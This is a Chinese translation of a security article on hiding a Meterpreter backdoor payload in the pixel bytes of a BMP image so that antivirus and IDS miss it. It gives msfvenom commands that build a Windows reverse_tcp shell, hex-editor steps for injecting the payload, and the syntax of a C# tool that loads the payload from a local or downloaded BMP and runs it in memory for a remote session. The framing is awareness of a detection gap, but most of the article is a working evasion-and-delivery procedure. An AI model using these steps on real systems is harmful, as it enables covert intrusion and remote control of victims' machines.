> 原文链接: https://www.anquanke.com//post/id/86058 


# 【技术分享】通过BMP图像像素传输后门payload


                                阅读量   
                                **99717**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：linkedin.com
                                <br>原文地址：[http://www.linkedin.com/pulse/transferring-backdoor-payloads-bmp-image-pixels-damon-mohammadbagher?trk=mp-reader-card](http://www.linkedin.com/pulse/transferring-backdoor-payloads-bmp-image-pixels-damon-mohammadbagher?trk=mp-reader-card)

译文仅供参考，具体内容表达以及含义原文为准



[![](https://p0.ssl.qhimg.com/t013f79c92ecdb76d24.jpg)](https://p0.ssl.qhimg.com/t013f79c92ecdb76d24.jpg)

翻译：[**华为未然实验室**](http://bobao.360.cn/member/contribute?uid=2794169747)

**预估稿费：200RMB**

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

<br>

在本文中，我将谈谈BMP文件，及如何使用位图文件传输数据或恶意软件有效载荷。通过图像传输或渗透数据的想法并不新鲜，那我为什么要谈论这方面的内容呢？因为这真的很危险，我还要谈谈关于该威胁的重要问题，比如，为何没人关心这个？

像往常一样，我要谈谈传输后门有效载荷，我们还可以测试绕过反病毒软件或IPS（入侵防御系统）/IDS（入侵检测系统）的威胁。

首先，我给大家展示一张简单的BMP图片。

从图1中可以看到，背景为黑色，上面是红线。现在告诉我：你看到这张图片中有什么问题吗？或有什么不合理之处吗？

[![](https://p0.ssl.qhimg.com/t01ede87fe0509a75b9.png)](https://p0.ssl.qhimg.com/t01ede87fe0509a75b9.png)

图1

现在我来给大家展示这张图片中您可能没有看到的不合理点。

[![](https://p4.ssl.qhimg.com/t0120c92c8a9c6cf546.png)](https://p4.ssl.qhimg.com/t0120c92c8a9c6cf546.png)

图2：图像像素背后的恶意软件有效载荷注入

现在大家可以看到我说的是哪儿了，现在我要谈谈这为什么危险，及其实现方法。

重要问题：

为什么通过图像传输有效载荷或数据是危险的？

1. 因为没有人认为这是重要的威胁。

2. 到目前为止，您是否曾通过防病毒软件扫描BMP文件？

3. 您是否使用防病毒软件实时检测和实时扫描BMP文件？

4. 这些防病毒软件能在多大程度上检测出该威胁？

5. 当有人在目标网站或受感染的网站中发布了BMP文件时，如何能检测到该威胁？

6. 可以使用该技术进行Web攻击吗？或可以使用该技术绕过WAF及从BMP文件读取有效载荷以进行Web攻击吗？

7. 对于Web和网络中的渗漏，这是通过端口80或443传输有效载荷和数据的最佳方式之一，尤其是端口80，无论BMP文件中是否进行了有效载荷加密。

8. 防火墙或IPS / IDS可以为此做什么，这些工具能在多大程度上检测出该技术？

9. 如果我在本地为我的后门使用该技术及图中的加密有效载荷，那么谁可以通过何种方式检测出？或者，如果我通过分块BMP文件使用该技术，意思是将有效载荷分解到一个以上图片文件中，那么如何检测到？

<br>

**实现方法**

首先，我来通过简单的例子谈谈手工实现方式（无代码），随后我将发布该技术的C#代码，并将解释如何将我的工具用于该技术。

我们是要通过像素将有效载荷注入BMP图像文件（仅BMP格式）。

每个像素都有其颜色的RGB代码。在该技术中，我们应该将我们的有效载荷注入到每个像素的RGB代码，所有我们的步骤如下：

```
像素背后的代码
像素 1 = R(112) , G(255) , B(10)
像素2 = R(192) , G(34) , B(84)
像素3 = R(111) , G(0) , B(190)
```

现在我们获得RGB有效载荷：112,255,10,192,34,84,111,0,190

```
十进制 == 十六进制
 
112 == 70
255 == ff
10 == 0A
 
192 == C0
34 == 22
84 == 54
 
111 == 6F
0 == 00
190 == BE
 
所以我们的像素有Meterpreter有效载荷: 70FF0AC022546F00BE
```

所以我们的像素有Meterpreter有效载荷：70FF0AC022546F00BE

从图3可以看到，我们有十六进制和十进制，及每个像素的颜色。

[![](https://p3.ssl.qhimg.com/t0190796c971dda7afb.png)](https://p3.ssl.qhimg.com/t0190796c971dda7afb.png)

图3

现在您已了解，对于注入方法，应改变BMP文件中的何处及如何改变。

以手工方式将Meterpreter有效载荷逐步注入BMP文件：

在这一部分，我要谈谈如何以手工方式逐步完成注入：

第1步：首先，您需要一个BMP文件，在Windows中，您需要使用MS Paint绘制一个。

注意：在Windows中只能通过MS Paint完成这些步骤。

从图4中可以看到，我们有一个700 * 2像素的空白BMP文件。

[![](https://p4.ssl.qhimg.com/t01fffbeeeaeab78248.png)](https://p4.ssl.qhimg.com/t01fffbeeeaeab78248.png)

图4：700 * 2像素的BMP文件

现在我们有一个700 * 2像素的空白BMP文件，现在您可以以“24位位图”颜色格式保存此文件。

第2步：您应该在Kali linux中制作Meterpreter有效载荷，通过其中一个命令，您可以获得Meterpreter有效载荷：



```
msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 -f c &gt; payload.txt
msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 -f num &gt; payload.txt
```

第3步：现在您应该将您第2步中的有效载荷注入到第1步中制作的BMP文件中，kali linux中通过hexeditor命令，Windows中通过“Hexeditor NEO”工具。

在图5中，您可以在更换有效载荷之前看到您在第1步中制作的BMP文件的hex editor NEO。

[![](https://p1.ssl.qhimg.com/t011f72b385b9acb8e2.png)](https://p1.ssl.qhimg.com/t011f72b385b9acb8e2.png)

图5

在图6中可以看到，我们有3个像素带有这些有效载荷“70FF0A-C02254-6F00BE”

[![](https://p4.ssl.qhimg.com/t019d849d4240872b05.png)](https://p4.ssl.qhimg.com/t019d849d4240872b05.png)

图6

现在您可以看到，当您想将这些有效载荷注入到图像（本例中为BMP）中时BMP中会发生什么。

为此，在该步骤中，您应该按图7所示在Kali linux中通过hexeditor命令编辑此BMP文件（第1步）。

此时，您应该使用工具Copy-Paste从“偏移36”到最后将Meterpreter有效载荷注入文件。偏移36是BMP头之后的第一个字节（BMP头是54字节），也就是图5中绿线部分。

注意：在更改BMP文件前，您应该将您的Meterpreter有效载荷从类型“0xfc”更改为“fc”，所以您的有效载荷应该如图9中的“Pay.txt”文件所示。（重要）

现在您应该从“Pay.txt”复制有效载荷字符串，然后粘贴到位图文件，从偏移36到最后，如图7和图8所示。

[![](https://p3.ssl.qhimg.com/t01f08d9eb37792b294.png)](https://p3.ssl.qhimg.com/t01f08d9eb37792b294.png)

图7

可以看到，您的有效载荷从图7中的“FF48”开始，以图8中的“FFD5”结束。

[![](https://p4.ssl.qhimg.com/t01706d051398288a54.png)](https://p4.ssl.qhimg.com/t01706d051398288a54.png)

图8

现在您可以保存该文件。

这些步骤之后，您将获得如图9所示的东西，现在您有一个带有注入的Meterpreter有效载荷的BMP文件。

[![](https://p0.ssl.qhimg.com/t01b040f15ffbb0c302.png)](https://p0.ssl.qhimg.com/t01b040f15ffbb0c302.png)

图9

从图9中可以看到，我们的位图文件有更多像素。

对于Meterpreter有效载荷，我们需要多少像素？

如果我们有510字节的Meterpreter有效载荷，那么我们要有170个像素用于有效载荷。

```
510字节有效载荷 , 3个字节 1个像素: R + G + B ==&gt; 1+1+1
 
510 / 3 = 170 像素
 
这就是MS Paint 中的0 …. 169像素，如图10所示。
```

[![](https://p1.ssl.qhimg.com/t01e13638739792e11e.png)](https://p1.ssl.qhimg.com/t01e13638739792e11e.png)

图10

在制作此BMP文件之后，您需要代码从BMP文件中读取这些有效载荷。

我通过C＃编写了一个代码，用于从BMP文件读取Meterpreter有效载荷，及在内存中执行（如后门）。您还可以使用我的工具通过Meterpreter注入方法制作新的位图文件，通过该代码，您可以修改其他BMP文件以注入Meterpreter有效载荷。

使用“NativePayload_Image.exe”逐步执行BMP文件中的Meterpreter有效载荷：

第1步：如果要查看NativePayload_Image语法，您应该不作任何改动运行该代码，如图11所示：

[![](https://p2.ssl.qhimg.com/t0151f44018c15d4692.png)](https://p2.ssl.qhimg.com/t0151f44018c15d4692.png)

图11

使用我的代码，您可以使用此语法为本地BMP文件获得非常简单的Meterpreter会话。

对于后门模式，使用该工具，您需要以下语法：

```
语法: NativePayload_Image.exe bitmap “filename.bmp” [Meterpreter_payload_Length] [Header_Length]
 
语法: NativePayload_Image.exe bitmap “filename.bmp”  510  54﻿
 
 
注意: Meterpreter有效载荷长度为510 (由msfvenom工具使用 “-f C” 或 “-f num”制作)
 
注意: BMP Header长度始终是54
```

[![](https://p1.ssl.qhimg.com/t015de7895e2654a0c2.png)](https://p1.ssl.qhimg.com/t015de7895e2654a0c2.png)

图12

从图12中可以看到，我获得了本地BMP文件的Meterpreter会话，“NewBitmaImge.bmp”是图9和图10中我的BMP文件。所以可以看到，我们可以通过“有效载荷注入方法”手工制作位图文件，如图9所示。还可以通过我的C＃代码在内存中执行位图文件的Meterpreter有效载荷，如图12所示。

在这种情况下，后门和BMP文件应该在同一个目录中，但是您也可以使用BMP文件的路径。

第2步：通过工具创建新的位图文件，并注入Meterpreter有效载荷

在这种情况下，您需要通过以下命令之一获得Meterpreter有效载荷：

```
msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 -f c &gt; payload.txt
 
msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 -f num &gt; payload.txt
```

注意：在此步骤中，您应该更改Msfvenom的输出有效负载，如图13所示。

注意：将“0xfc , 0x48 , 0x83”更改为“fc,48,83, …”

[![](https://p1.ssl.qhimg.com/t016405884e576b79cc.png)](https://p1.ssl.qhimg.com/t016405884e576b79cc.png)

图13

如图14所示，您可以创建具有新的File_Name的位图文件。

[![](https://p3.ssl.qhimg.com/t01fb7791506f56a827.png)](https://p3.ssl.qhimg.com/t01fb7791506f56a827.png)

图14

正确的语法是：

```
语法: NativePayload_Image.exe create “Newfilename.bmp” [Meterpreter_payload]
 
语法: NativePayload_Image.exe create “Newfilename.bmp” fc,48,83,....
```

第3步：修改BMP文件，以将Meterpreter有效载荷注入现有的BMP文件。

在这种情况下，您需要有效载荷，及一个用于添加或注入有效载荷的BMP文件，如图15所示。

[![](https://p5.ssl.qhimg.com/t018fd9aae75d9ac861.png)](https://p5.ssl.qhimg.com/t018fd9aae75d9ac861.png)

图15

现在您应该使用此语法修改此文件。

```
语法: NativePayload_Image.exe modify “Existfilename.bmp” [header_length] [Meterpreter_payload]
 
语法: NativePayload_Image.exe modify “Existfilename.bmp”  54  fc,48,83,....
 
 
注意: BMP header长度始终是54。
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t016c5794d029cd55b1.png)

图16

如图16所示，修改此文件后，我们可以在“300％缩放”后看到黑色背景中的Meterpreter有效载荷像素。

从下一张图中可以看到，这个修改后的BMP文件很有效。

此时，我要在网站中使用该BMP文件，以供通过HTTP流量下载，所以我们使用上一步中制作的“MyBMP_to_Modify.bmp”文件。我在Kali linux中做了一个Web服务器，以供通过“Url”和HTTP流量下载该位图 文件。

第4步：通过“Url”和HTTP流量从网站下载BMP文件。

我们现在有了该“MyBMP_to_Modify.bmp”文件，我通过Python Web服务器通过“python -m SimpleHTTPServer”在kali linux web服务器中使用这个文件，最终我通过“HTTP流量”获得了Meterpreter会话，如图17所示。

通过Url下载BMP文件，我们的语法是：

```
语法: NativePayload_Image.exe url “Url” [Meterpreter_payload_Length] [Header_Length]
 
语法: NativePayload_Image.exe url "https://url.com/MyBMP_to_Modify.bmp"  510   54
```

[![](https://p0.ssl.qhimg.com/t0106ec0d82d53823da.png)](https://p0.ssl.qhimg.com/t0106ec0d82d53823da.png)

图17

<br>

**总结**

这一技术并不新鲜，但我认为没有人关注这个威胁，但这真的危险。我们应该检查我们的防病毒软件是否面临此威胁，尤其是当有人在BMP文件中使用加密有效载荷时（大多数防病毒软件均无法检测到），或有人使用该技术时将有效载荷分块到一个以上BMP文件时（也很危险）。我认为默认情况下，大多数防病毒软件不实时扫描BMP扩展文件，我认为文件系统手动扫描也不能检测到BMP文件中的这个有效载荷。如果有人使用该技术进行数据的渗漏传输（无BMP文件中的后门有效载荷），那我们如何来防御？我们如何来检测该方法？现在就去检查一下您的防病毒软件吧！

C＃代码：[https://github.com/DamonMohammadbagher/NativePayload_Image](https://github.com/DamonMohammadbagher/NativePayload_Image)
